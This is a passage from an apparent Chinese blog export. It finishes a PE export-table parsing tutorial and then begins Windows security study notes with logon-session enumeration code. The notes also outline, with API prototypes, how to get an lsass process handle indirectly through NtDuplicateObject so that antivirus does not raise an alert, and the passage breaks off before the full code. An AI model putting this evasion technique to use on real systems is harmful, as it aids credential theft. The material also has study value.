<h4 id="Base："><a href="#Base：" class="headerlink" title="Base："></a>Base：</h4><p>该字段指出了导出函数序号的起始值。dll中第一个导出函数的序号并非从0开始，导出函数的编号等于从AddressOfFunction开始的序号加上这个值。大概意思是这样</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014205036689.png" alt="image-20211014205036689"></p>
<p>如图所示，Func1的函数编号为nBase + 0 = 200h， Func2的函数编号为 nbase + 1 = 201h</p>
<h4 id="NumberOfFunctions"><a href="#NumberOfFunctions" class="headerlink" title="NumberOfFunctions"></a>NumberOfFunctions</h4><p>该字段定义了文件中导出函数的总个数</p>
<h4 id="NumberOfNames"><a href="#NumberOfNames" class="headerlink" title="NumberOfNames"></a>NumberOfNames</h4><p>在导出表中，有些函数是定义名字的，有些是没有定义名字的。该字段记录了所有定义名字函数的个数。如果这个值是0，则表示所有的函数都没有定义名字。NumbersOfNames一定小于等于NumbersOfFuctions</p>
<h4 id="AddressOfNames"><a href="#AddressOfNames" class="headerlink" title="AddressOfNames"></a>AddressOfNames</h4><p>该值为一个指针。该指针指向的位置是一连串的DWORD值，这些值均指向了对应的定义了函数名的函数的字符串地址。这一连串的DWORD值的个数为NumberOfNames</p>
<h4 id="AddressOfFunctions"><a href="#AddressOfFunctions" class="headerlink" title="AddressOfFunctions"></a>AddressOfFunctions</h4><p>该指针指向了全部导出函数的入口地址的起始。从入口地址开始为DWORD数组，数组的个数由NumbersOfFuctions决定</p>
<p>导出函数的每一个地址<strong>按函数的编号顺序</strong>依次往后排开。在内存中，可以通过<strong>函数编号</strong>来定位某个函数的地址</p>
<h4 id="AddressOfNameOrdinals"><a href="#AddressOfNameOrdinals" class="headerlink" title="AddressOfNameOrdinals"></a>AddressOfNameOrdinals</h4><p>该值也是一个指针，与AddressOfNames是<strong>一一对应</strong>关系</p>
<p>不同的是，AddressOfNames指向的是字符串的指针数组，而AddressOfNameOrdinals则指向了该函数在AddressOfFunctions中的<strong>索引值</strong></p>
<hr>
<p>注意：<strong>索引值数据类型为WORD，而非DWORD</strong>。该值与函数编号是两个不同的概念，两者的关系为：</p>
<p>索引值 = 编号 - Base</p>
<h3 id="根据结构分析导出表"><a href="#根据结构分析导出表" class="headerlink" title="根据结构分析导出表"></a>根据结构分析导出表</h3><p>根据之前拿到的导出表FOA + 40 - 1 ，拿到导出表范围，自0x79B0 至0x79D7</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015093614192.png" alt="image-20211015093614192"></p>
<table>
<thead>
<tr>
<th align="center">成员</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Characteristics</td>
<td>0x00000000</td>
<td>标志，未用</td>
</tr>
<tr>
<td align="center">TimeDateStamp</td>
<td>0xFFFFFFFF</td>
<td>时间戳</td>
</tr>
<tr>
<td align="center">MajorVersion</td>
<td>0x0000</td>
<td>未用</td>
</tr>
<tr>
<td align="center">MinorVersion</td>
<td>0x0000</td>
<td>未用</td>
</tr>
<tr>
<td align="center">Name</td>
<td>0x0001900A</td>
<td>指向该导出表文件名字符串</td>
</tr>
<tr>
<td align="center">Base</td>
<td>0x0000000A</td>
<td>导出函数的起始序号</td>
</tr>
<tr>
<td align="center">NumberOfFunctions</td>
<td>0x00000008</td>
<td>所有导出函数的个数</td>
</tr>
<tr>
<td align="center">NumberOfNames</td>
<td>0x00000003</td>
<td>以函数名字导出的函数个数</td>
</tr>
<tr>
<td align="center">AddressOfFunctions</td>
<td>0x00018FD8</td>
<td>导出函数地址表RVA</td>
</tr>
<tr>
<td align="center">AddressOfNames</td>
<td>0x00018FF8</td>
<td>导出函数名称表RVA</td>
</tr>
<tr>
<td align="center">AddressOfNameOrdinals</td>
<td>0x00019004</td>
<td>导出函数序号表RVA</td>
</tr>
</tbody></table>
<h4 id="Name-1"><a href="#Name-1" class="headerlink" title="Name"></a>Name</h4><p>存储的值为指针，该指针为RVA(0x1900A)，同样需要转换成FOA</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x1900A</span>,dos,nt,sectionArr); <span class="comment">//0x1900A 为name的rva</span></span><br></pre></td></tr></table></figure>

<p>运行可得</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015110233872.png" alt="image-20211015110233872"></p>
<p>利用16进制编辑器得到0x7A0A,拿到Name,PE文件的文件名字符串，以00结尾，MyDll.dll</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015110551475.png" alt="image-20211015110551475"></p>
<h4 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h4><p>导出函数起始序号的RVA 为 0xA , 对应十进制10</p>
<p>回顾之前导出函数的定义</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">Add @<span class="number">12</span> </span><br><span class="line">Sub @<span class="number">15</span> NONAME</span><br><span class="line">Multiply @<span class="number">17</span></span><br><span class="line">Divide @<span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>可以看出，此处的base=最小的序号=min{12,15,17,10}=10</p>
<h4 id="NumberOfFunctions-1"><a href="#NumberOfFunctions-1" class="headerlink" title="NumberOfFunctions"></a>NumberOfFunctions</h4><p>所有导出函数的个数为8</p>
<p>为什么前面声明的导出函数只有4个，但这里显示的却会有八个？</p>
<p>此处的NumberOfFunctions = 最大的序号减去最小的序号 +1 =17-10+1=8</p>
<h4 id="NumberOfNames-1"><a href="#NumberOfNames-1" class="headerlink" title="NumberOfNames"></a>NumberOfNames</h4><p>以函数名字导出的函数个数为3，和定义声明中有名称的导出函数数量一致</p>
<h4 id="AddressOfFunctions-1"><a href="#AddressOfFunctions-1" class="headerlink" title="AddressOfFunctions"></a>AddressOfFunctions</h4><p>存储的值为指针，该指针为RVA(0x18FD8)，同样需要转换为FOA</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x18FD8</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p>利用之前的VA转FOA程序修改VaToFoa32代码处数值</p>
<p>运行程序可得AddressOfFunctions处文件偏移为0x79D8,跳转到该地址</p>
<p>根据AddressOfFunctions （DWORD）为数组且数组个数由NumbersOfFuctions决定，本dll文件NumberOfFunctions为8</p>
<p>因此8x4=32（10进制字节数）</p>
<p><strong>拿到每个函数的RVA</strong>.</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015112733536.png" alt="image-20211015112733536"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015113610137.png" alt="image-20211015113610137"></p>
<p>记录下每个导出函数的地址并转换为RVA为FOA得到</p>
<table>
<thead>
<tr>
<th>Oridinals（索引）</th>
<th>序号(Base+ORIDINALS)</th>
<th>导出函数地址(RVA)</th>
<th>导出函数地址(FOA)</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>10+0 = 10</td>
<td>0x00011320</td>
<td>0x720</td>
</tr>
<tr>
<td>1</td>
<td>10+1=11</td>
<td>0x00000000</td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>12</td>
<td>0x00011302</td>
<td>0x702</td>
</tr>
<tr>
<td>3</td>
<td>13</td>
<td>0x00000000</td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>14</td>
<td>0x00000000</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>15</td>
<td>0x000111EF</td>
<td>0x5EF</td>
</tr>
<tr>
<td>6</td>
<td>16</td>
<td>0x00000000</td>
<td></td>
</tr>
<tr>
<td>7</td>
<td>17</td>
<td>0x000111A4</td>
<td>0x5A4</td>
</tr>
</tbody></table>
<p>可以发现，只有4个函数存在有效地址，跟前方Mydll.dll定义的序号以及数量一致</p>
<h4 id="AddressOfNames-1"><a href="#AddressOfNames-1" class="headerlink" title="AddressOfNames"></a>AddressOfNames</h4><p>内部存储着导出函数名称表的RVA</p>
<p>存储的值为指针，该指针为RVA，同样需要转为FOA</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x18FF8</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015115246528.png" alt="image-20211015115246528"></p>
<p>16进制编辑器直接跳转过去</p>
<p>导出函数名称表 = 导出函数名称表单个大小(DWORD) * NumberOfNames值 = 4 * 3 = 12（十进制）</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015120351876.png" alt="image-20211015120351876"></p>
<p>拿到所有导出函数名称的地址</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">0x00019014</span></span><br><span class="line"><span class="number">0x00019018</span></span><br><span class="line"><span class="number">0x0001901F</span></span><br></pre></td></tr></table></figure>

<p>利用程序将RVA转为OA</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x19014</span>,dos,nt,sectionArr);</span><br><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x19018</span>,dos,nt,sectionArr);</span><br><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x1901F</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p>按照顺序依次拿到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foa 7a14</span><br><span class="line">foa 7a18</span><br><span class="line">foa 7a1f</span><br></pre></td></tr></table></figure>

<p>即得到有名称函数的名称地址为：</p>
<table>
<thead>
<tr>
<th>顺序索引</th>
<th>RVA</th>
<th>FOA</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>0x19014</td>
<td>0x7A14</td>
</tr>
<tr>
<td>2</td>
<td>0x19018</td>
<td>0x7A18</td>
</tr>
<tr>
<td>3</td>
<td>0x1901F</td>
<td>0x7A1F</td>
</tr>
</tbody></table>
<p>利用FOA与16进制编辑器拿到各自的函数名字符串</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015120841885.png" alt="image-20211015120841885"></p>
<table>
<thead>
<tr>
<th>顺序索引</th>
<th>RVA</th>
<th>FOA</th>
<th>导出函数名称</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>0x19014</td>
<td>0x7A14</td>
<td>Add</td>
</tr>
<tr>
<td>2</td>
<td>0x19018</td>
<td>0x7A18</td>
<td>Divide</td>
</tr>
<tr>
<td>3</td>
<td>0x1901F</td>
<td>0x7A1F</td>
<td>Multiply</td>
</tr>
</tbody></table>
<h4 id="AddressOfNameOrdinals-1"><a href="#AddressOfNameOrdinals-1" class="headerlink" title="AddressOfNameOrdinals"></a>AddressOfNameOrdinals</h4><p>存储的值为指针，指针为RVA，同样需要转为FOA在PE文件中读取</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x19004</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p>获取foa为 7A04</p>
<p>跳转至0x7A04位置</p>
<p>由NumberOfFunctions可知共有3个有名函数</p>
<p>因此Ordinals列表为 4x3=12</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015121856554.png" alt="image-20211015121856554"></p>
<p>拿到有名称的Ordinals</p>
<p>Ordinals的为Word型，共2个字节</p>
<table>
<thead>
<tr>
<th>顺序索引</th>
<th>Oridinals</th>
<th>序号(Oridinals+Base)</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>0x0002</td>
<td>12</td>
</tr>
<tr>
<td>2</td>
<td>0x0000</td>
<td>10</td>
</tr>
<tr>
<td>3</td>
<td>0x0007</td>
<td>17</td>
</tr>
</tbody></table>
<p>根据有名称函数的Oridinals结合前面得到的AddressOfFunctions和AdressOfNames，就可以得到函数的名称、函数的地址的关系</p>
<table>
<thead>
<tr>
<th>顺序索引</th>
<th>Oridinals</th>
<th>导出函数地址(RVA)</th>
<th>导出函数地址(FOA)</th>
<th>函数名称</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>0x0002</td>
<td>0x00011302</td>
<td>0x702</td>
<td>Add</td>
</tr>
<tr>
<td>2</td>
<td>0x0000</td>
<td>0x00011320</td>
<td>0x720</td>
<td>Divide</td>
</tr>
<tr>
<td>3</td>
<td>0x0007</td>
<td>0x000111A4</td>
<td>0x5A4</td>
<td>Multiply</td>
</tr>
</tbody></table>
<p>至此导出表分析完毕</p>
<h3 id="由导出表获得导出函数"><a href="#由导出表获得导出函数" class="headerlink" title="由导出表获得导出函数"></a>由导出表获得导出函数</h3><p>从前面的分析中可以得知查询导出表有两个办法</p>
<ul>
<li>根据导出表函数名称获得导出函数地址</li>
<li>根据导出表函数序号获得导出函数地址</li>
</ul>
<h4 id="函数名称获取导出函数地址"><a href="#函数名称获取导出函数地址" class="headerlink" title="函数名称获取导出函数地址"></a>函数名称获取导出函数地址</h4><ol>
<li>根据导出表的函数名称去AddressOfNames指向的每个名称字符串查询是否有匹配的字符串</li>
<li>找到匹配的字符串后，根据找到的顺序索引去AddressOfNameOrdinals中找到对应的Ordinals</li>
<li>根据前面找到的Ordinals到AddressOfFunctions中获得函数地址</li>
</ol>
<p>图示</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015125252798.png" alt="image-20211015125252798"></p>
<h4 id="函数序号取得导出函数"><a href="#函数序号取得导出函数" class="headerlink" title="函数序号取得导出函数"></a>函数序号取得导出函数</h4><ol>
<li>根据函数序号-导出表.Base获得导出函数的Ordinal</li>
<li>根据前面拿到的Ordinals到AddressOfFunctions中获得函数地址</li>
</ol>
<p>图示</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015125443438.png" alt="image-20211015125443438"></p>
<p>也可利用工具得出导出表的RVA,后利用RVA转FOA可获得其文件偏移量</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015125801883.png" alt="image-20211015125801883"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015130012615.png" alt="image-20211015130012615"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>导出表中还包含了三张小表:导出函数地址表、导出函数名称表</li>
<li>导出表中存储了指向这三张表的指针，而不是直接存储表内的内容</li>
<li>无论是根据函数名称还是函数序号来获取导出函数，都需要用到Ordinals,用Ordinals到导出函数地址表中获取地址</li>
<li>导出表的Base取决于编写DLL时导出定义的最小序号</li>
<li>导出表的NumberOfFuctions取决于编写DLL时导出定义的序号最大差值+1</li>
<li>导出名称表和导出函数序号表只对有名称的导出函数有效</li>
</ul>
<p>学习复现自52pojie论坛内的lyl640abc 师傅的pe笔记系列</p>
]]></content>
      <categories>
        <category>PE结构</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows安全学习随笔</title>
    <url>/2023/03/07/Windows%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/</url>
    <content><![CDATA[<h3 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h3><p>​    许久不写博客，甚至已经有些忘记格式该是如何的，本篇博文用于记录我在学习Windows安全时的一些知识点。</p>
<h3 id="0x2-实例Demo"><a href="#0x2-实例Demo" class="headerlink" title="0x2 实例Demo"></a>0x2 实例Demo</h3><h4 id="0x01-LogonSessionList获取活动会话信息"><a href="#0x01-LogonSessionList获取活动会话信息" class="headerlink" title="0x01 LogonSessionList获取活动会话信息"></a>0x01 LogonSessionList获取活动会话信息</h4><hr>
<p>​    利用<code>LogonSessionList</code>结构我们可以读取系统内当前活动会话之信息，若用户尚未登陆，则无法通过此结构读取检测到用户的Session，因为系统内这时并没有与该用户关联的活动登录会话。</p>
<p>​    同时，当用户注销会话后，我们也不可通过此结构获取其信息。</p>
<p>​    导出<code>LogonSessionList</code>我们可以使用<code>LsaEnumerateLogonSessions</code>函数获取其数组指针，随后通过<code>LsaGetLogonSessionData </code>函数读取其中的结构。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">LsaEnumerateLogonSessions</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PULONG LogonSessionCount,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PLUID  *LogonSessionList</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">LsaGetLogonSessionData</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  PLUID                        LogonId,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PSECURITY_LOGON_SESSION_DATA *ppLogonSessionData</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>其中，我们需要<code>SECURITY_LOGON_SESSION_DATA</code>结构内的信息，其结构如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SECURITY_LOGON_SESSION_DATA</span> &#123;</span></span><br><span class="line">  ULONG                     Size;</span><br><span class="line">  LUID                      LogonId;</span><br><span class="line">  LSA_UNICODE_STRING        UserName;</span><br><span class="line">  LSA_UNICODE_STRING        LogonDomain;</span><br><span class="line">  LSA_UNICODE_STRING        AuthenticationPackage;</span><br><span class="line">  ULONG                     LogonType;</span><br><span class="line">  ULONG                     Session;</span><br><span class="line">  PSID                      Sid;</span><br><span class="line">  LARGE_INTEGER             LogonTime;</span><br><span class="line">  LSA_UNICODE_STRING        LogonServer;</span><br><span class="line">  LSA_UNICODE_STRING        DnsDomainName;</span><br><span class="line">  LSA_UNICODE_STRING        Upn;</span><br><span class="line">  ULONG                     UserFlags;</span><br><span class="line">  LSA_LAST_INTER_LOGON_INFO LastLogonInfo;</span><br><span class="line">  LSA_UNICODE_STRING        LogonScript;</span><br><span class="line">  LSA_UNICODE_STRING        ProfilePath;</span><br><span class="line">  LSA_UNICODE_STRING        HomeDirectory;</span><br><span class="line">  LSA_UNICODE_STRING        HomeDirectoryDrive;</span><br><span class="line">  LARGE_INTEGER             LogoffTime;</span><br><span class="line">  LARGE_INTEGER             KickOffTime;</span><br><span class="line">  LARGE_INTEGER             PasswordLastSet;</span><br><span class="line">  LARGE_INTEGER             PasswordCanChange;</span><br><span class="line">  LARGE_INTEGER             PasswordMustChange;</span><br><span class="line">&#125; SECURITY_LOGON_SESSION_DATA, *PSECURITY_LOGON_SESSION_DATA;</span><br></pre></td></tr></table></figure>

<p>​    我们可以通过for循环的方式将相关信息遍历导出。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;NTSecAPI.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Secur32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">	ULONG LogonSessionCount;</span><br><span class="line">	PLUID LogonSessionList;</span><br><span class="line">	PSECURITY_LOGON_SESSION_DATA pLogonSessionData;</span><br><span class="line">	NTSTATUS status;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//分配内存</span></span><br><span class="line">	pLogonSessionData = (PSECURITY_LOGON_SESSION_DATA)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(SECURITY_LOGON_SESSION_DATA));</span><br><span class="line"></span><br><span class="line">	status = <span class="built_in">LsaEnumerateLogonSessions</span>(&amp;LogonSessionCount, &amp;LogonSessionList);</span><br><span class="line">	<span class="keyword">if</span> (status != ERROR_SUCCESS) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;LsaEnumrateLogonSessions ErrorCode:%u\r\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//读取现存有效session数</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;SessionCount %d\r\n&quot;</span>, LogonSessionCount);</span><br><span class="line">	<span class="comment">//成功导出sessioncount 枚举每个session username</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LogonSessionCount; i++) &#123;</span><br><span class="line">		<span class="built_in">LsaGetLogonSessionData</span>(LogonSessionList + i, &amp;pLogonSessionData);</span><br><span class="line">		_tprintf(<span class="string">&quot;%ws\\%ws\r\n&quot;</span>, pLogonSessionData-&gt;LogonDomain,pLogonSessionData-&gt;UserName.Buffer);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">LsaFreeReturnBuffer</span>(pLogonSessionData);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果如下:</p>
<p><img src="/images/Windows%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94.assets/image-20230307105906988.png" alt="image-20230307105906988"></p>
<h4 id="0x02-间接获取进程句柄，回调函数加密lsass规避杀软"><a href="#0x02-间接获取进程句柄，回调函数加密lsass规避杀软" class="headerlink" title="0x02 间接获取进程句柄，回调函数加密lsass规避杀软"></a>0x02 间接获取进程句柄，回调函数加密lsass规避杀软</h4><hr>
<p>​    随着技术的发展，杀软对lsass等进程句柄的获取有了更加严格的监控，下面我们将使用NtDuplicateObject间接获取进程句柄，避免告警。</p>
<h5 id="0x001大体流程"><a href="#0x001大体流程" class="headerlink" title="0x001大体流程:"></a>0x001大体流程:</h5><ol>
<li>获得SeDebugPrivilege调试权限。</li>
<li>使用NtQuerySystemInformation获取所有进程打开的句柄</li>
<li>利用OpenProcess获取具有PROCESS_DUP_HANDLE权限的句柄</li>
<li>使用NtduplicateObject来Copy获取上述句柄的副本</li>
<li>通过NtQueryObject查询句柄信息，筛选出类型为Process的句柄</li>
<li>通过QueryFullProcessimageName判断进程是否为lsass的句柄</li>
</ol>
<h5 id="0x002函数、结构原型"><a href="#0x002函数、结构原型" class="headerlink" title="0x002函数、结构原型:"></a>0x002函数、结构原型:</h5><h6 id="NtQueryObject"><a href="#NtQueryObject" class="headerlink" title="NtQueryObject"></a>NtQueryObject</h6><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(NTAPI* NtQueryObject)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	IN OPTIONAL  HANDLE                   Handle,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN           OBJECT_INFORMATION_CLASS ObjectInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">	OUT OPTIONAL PVOID                    ObjectInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN            ULONG                    ObjectInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">	OUT OPTIONAL PULONG                   ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<h6 id="NtQuerySystemInformation"><a href="#NtQuerySystemInformation" class="headerlink" title="NtQuerySystemInformation"></a>NtQuerySystemInformation</h6><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(NTAPI* NtQuerySystemInformation)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	IN          SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN OUT      PVOID                    SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">	IN          ULONG                    SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">	OUT OPTIONAL PULONG                   ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<h6 id="NtDuplicateObject"><a href="#NtDuplicateObject" class="headerlink" title="NtDuplicateObject"></a>NtDuplicateObject</h6><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* NtDuplicateObject)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE SourceProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE SourceHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE TargetProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE TargetHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG Attributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG Options</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_HANDLE</span> &#123;</span></span><br><span class="line">	ULONG ProcessId;</span><br><span class="line">	BYTE ObjectTypeNumber;</span><br><span class="line">	BYTE Flags;</span><br><span class="line">	USHORT Handle;</span><br><span class="line">	PVOID Object;</span><br><span class="line">	ACCESS_MASK GrantedAccess;</span><br><span class="line">&#125; SYSTEM_HANDLE, * PSYSTEM_HANDLE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_HANDLE_INFORMATION</span> &#123;</span></span><br><span class="line">	ULONG HandleCount;	<span class="comment">//Handle counts</span></span><br><span class="line">	SYSTEM_HANDLE Handles[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;</span><br></pre></td></tr></table></figure>



<h5 id="0x003流程分析"><a href="#0x003流程分析" class="headerlink" title="0x003流程分析:"></a>0x003流程分析:</h5><p>​    获取Debug权限的操作，我们暂且略过，从第二步如何使用<code>NtQuerySystemInformation</code>获取系统内句柄信息开始演示.</p>
<p>​    <strong>获取函数地址，其余Nt函数流程大体一致</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HMODULE hModule = GetModuleHandle(&quot;ntdll.dll&quot;);</span><br><span class="line">pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hModule, &quot;NtQuerySystemInformation&quot;);</span><br><span class="line">	if (!NtQuerySystemInformation) &#123;</span><br><span class="line">		printf(&quot;NtQuerySystemInformation get address failed %d\r\n&quot;,GetLastError());</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>​    <strong>获取系统内的句柄信息</strong></p>
<p>​    提前申请<code>SYSTEM_HANDLE_INFORMATION</code>内存空间，使用while循环判断执行结果，若ReturnLength不足，函数会将缓冲区所需的大小返回至ReturnLength当中，继续循环申请内存直至成功。</p>
